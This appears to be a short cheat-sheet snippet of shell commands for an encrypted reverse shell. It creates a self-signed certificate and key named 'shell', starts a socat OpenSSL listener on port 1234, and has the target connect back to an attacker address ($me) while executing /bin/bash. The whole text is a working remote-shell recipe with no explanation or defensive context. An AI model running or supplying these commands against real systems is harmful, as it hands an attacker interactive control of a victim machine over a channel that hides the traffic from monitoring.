openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 10 -out shell.crt
cat shell.crt shell.key > shell.pem
socat OPENSSL-LISTEN:1234,cert=shell.pem,verify=0 -
socat OPENSSL:$me:1234,verify=0 EXEC:/bin/bash
